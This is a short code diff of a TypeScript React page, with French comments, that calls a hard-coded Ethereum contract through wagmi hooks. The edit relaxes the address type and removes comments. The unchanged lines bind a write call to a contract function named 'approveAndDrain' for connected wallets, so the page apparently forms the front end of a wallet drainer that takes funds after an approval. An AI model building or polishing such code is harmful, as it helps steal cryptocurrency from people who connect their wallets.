@@ -92,20 +92,20 @@ const contractAbi = [
   }
 ];
 
-// Utilisation du type `0x${string}` pour contractAddress
-const contractAddress: `0x${string}` = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat
+// Adresse du contrat sous type string
+const contractAddress: string = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Adresse du contrat
 
 export default function Home() {
   const { isConnected, address } = useAccount();
 
-  // Lire le owner du contrat (exemple d'utilisation de useContractRead)
+  // Lire le owner du contrat
   const { data: owner } = useContractRead({
     address: contractAddress,
     abi: contractAbi,
     functionName: "owner",
   });
 
-  // Écrire sur le contrat (exécuter approveAndDrain)
+  // Écrire sur le contrat
   const { write: approveAndDrain, isLoading } = useContractWrite({
     address: contractAddress,
     abi: contractAbi,
